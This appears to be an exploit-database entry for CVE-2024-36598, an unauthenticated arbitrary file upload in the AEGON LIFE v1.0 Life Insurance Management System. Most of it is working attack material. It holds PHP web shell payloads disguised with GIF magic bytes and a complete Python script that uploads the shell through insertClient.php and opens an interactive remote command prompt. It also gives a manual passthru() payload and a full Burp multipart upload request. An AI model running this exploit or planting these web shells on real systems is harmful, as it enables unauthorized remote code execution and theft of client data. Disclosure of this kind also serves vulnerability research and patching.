@@ -1,0 +1,231 @@
+id: 39656
+date: 06/14/2024
+title: AEGON LIFE v1.0 Life Insurance Management System - Remote Code Execution Vulnerability
+author: Aslam Anwar Mahimkar
+cves: CVE-2024-36598
+
+# Exploit Title:  Life Insurance Management System- Unauthenticated Remote Code Execution (RCE)
+# Exploit Author: Aslam Anwar Mahimkar
+# Category: Web application
+# Vendor Homepage: https://projectworlds.in/
+# Software Link: https://projectworlds.in/life-insurance-management-system-in-php/
+# Version: AEGON LIFE v1.0
+# Tested on: Linux
+# CVE: CVE-2024-36598
+
+# Description:
+----------------
+
+-An arbitrary file upload vulnerability in Aegon Life v1.0 allows attackers to execute arbitrary code via uploading a crafted PHP file by adding image/gif magic bytes in payload.
+
+-In insertClient.php fileToUpload is only checking for image file but not checking for extensions, also header.php is not properly handling the redirection hence allowing Unauthenticated redirect.
+
+
+# Payload:
+------------------
+
+payload = "GIF89a;'<?php echo shell_exec($_GET[\'cmd\']); ?>'"
+
+
+# RCE via executing exploit:
+---------------------------------------
+
+    # Step : run the exploit in python with this command: python3 shell.py  http://localhost/lims/
+    # will lead to RCE shell.
+  
+POC
+-------------------
+
+import argparse
+import random
+import requests
+import string
+import sys
+
+parser = argparse.ArgumentParser()
+parser.add_argument('url', action='store', help='The URL of the target.')
+args = parser.parse_args()
+
+url = args.url.rstrip('/')
+random_file = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(10))
+
+payload = "GIF89a;'<?php echo shell_exec($_GET[\'cmd\']); ?>'"
+
+file = {'fileToUpload': (random_file + '.php', payload, 'text/php')}
+print('> Attempting to upload PHP web shell...')
+r = requests.post(url + '/insertClient.php', files=file, data={'agent_id':''}, verify=False)
+print('> Verifying shell upload...')
+r = requests.get(url + '/uploads/' + random_file + '.php', params={'cmd':'echo ' + random_file}, verify=False)
+
+if random_file in r.text:
+    print('> Web shell uploaded to ' + url + '/uploads/' + random_file + '.php')
+    print('> Example command usage: ' + url + '/uploads/' + random_file + '.php?cmd=whoami')
+    launch_shell = str(input('> Do you wish to launch a shell here? (y/n): '))
+    if launch_shell.lower() == 'y':
+        while True:
+            cmd = str(input('RCE $ '))
+            if cmd == 'exit':
+                sys.exit(0)
+            r = requests.get(url + '/uploads/' + random_file + '.php', params={'cmd':cmd}, verify=False)
+            print(r.text)
+else:
+    if r.status_code == 200:
+        print('> Web shell uploaded to ' + url + '/uploads/' + random_file + '.php, however a simple command check failed to execute. Perhaps shell_exec is disabled? Try changing the payload.')
+    else:
+        print('> Web shell failed to upload! The web server may not have write permissions.')
+
+---------------------------------------------------------------------------------------------------------------------------
+
+### Can also performed manually.
+
+
+Payload:
+--------------
+
+GIF89a;
+<?php
+echo"<pre>";
+passthru($_GET['cmd']);
+echo"<pre>";
+?>
+
+# Attack Vectors:
+-------------------------
+
+After uploading malicious image can access it to get the shell
+
+http://localhost/lims/uploads/shell2.gif.php?cmd=id
+
+
+Burp Suit Request
+-----------------------------
+
+POST /lims/insertClient.php HTTP/1.1
+Host: localhost
+Content-Length: 2197
+Cache-Control: max-age=0
+sec-ch-ua: 
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: ""
+Upgrade-Insecure-Requests: 1
+Origin: http://localhost
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5plGALZGPOOdBlF0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: http://localhost/lims/addClient.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+------WebKitFormBoundary5plGALZGPOOdBlF0
+Content-Disposition: form-data; name="client_id"
+
+1716015032
+
+------WebKitFormBoundary5plGALZGPOOdBlF0
+Content-Disposition: form-data; name="client_password"
+
+Password
+
+------WebKitFormBoundary5plGALZGPOOdBlF0
+Content-Disposition: form-data; name="name"
+
+Test
+
+------WebKitFormBoundary5plGALZGPOOdBlF0
+Content-Disposition: form-data; name="fileToUpload"; filename="shell2.gif.php"
+Content-Type: application/x-php
+
+GIF89a;
+<?php
+echo"<pre>";
+passthru($_GET['cmd']);
+echo"<pre>";
+?>
+
+------WebKitFormBoundary5plGALZGPOOdBlF0
+Content-Disposition: form-data; name="sex"
+
+Male
+
+------WebKitFormBoundary5plGALZGPOOdBlF0
+Content-Disposition: form-data; name="birth_date"
+
+1/1/1988
+
+------WebKitFormBoundary5plGALZGPOOdBlF0
+Content-Disposition: form-data; name="maritial_status"
+
+M
+
+------WebKitFormBoundary5plGALZGPOOdBlF0
+Content-Disposition: form-data; name="nid"
+
+1
+
+------WebKitFormBoundary5plGALZGPOOdBlF0
+Content-Disposition: form-data; name="phone"
+
+1
+
+------WebKitFormBoundary5plGALZGPOOdBlF0
+Content-Disposition: form-data; name="address"
+
+1
+
+------WebKitFormBoundary5plGALZGPOOdBlF0
+Content-Disposition: form-data; name="policy_id"
+
+1
+
+------WebKitFormBoundary5plGALZGPOOdBlF0
+Content-Disposition: form-data; name="agent_id"
+
+Agent007
+
+------WebKitFormBoundary5plGALZGPOOdBlF0
+Content-Disposition: form-data; name="nominee_id"
+
+1716015032-275794639
+
+------WebKitFormBoundary5plGALZGPOOdBlF0
+Content-Disposition: form-data; name="nominee_name"
+
+Test1
+
+------WebKitFormBoundary5plGALZGPOOdBlF0
+Content-Disposition: form-data; name="nominee_sex"
+
+1
+
+------WebKitFormBoundary5plGALZGPOOdBlF0
+Content-Disposition: form-data; name="nominee_birth_date"
+
+1
+
+------WebKitFormBoundary5plGALZGPOOdBlF0
+Content-Disposition: form-data; name="nominee_nid"
+
+1
+
+------WebKitFormBoundary5plGALZGPOOdBlF0
+Content-Disposition: form-data; name="nominee_relationship"
+
+1
+
+------WebKitFormBoundary5plGALZGPOOdBlF0
+Content-Disposition: form-data; name="priority"
+
+1
+
+------WebKitFormBoundary5plGALZGPOOdBlF0
+Content-Disposition: form-data; name="nominee_phone"
+
+1
+------WebKitFormBoundary5plGALZGPOOdBlF0
+
+#  0day.today [2024-06-19]  #
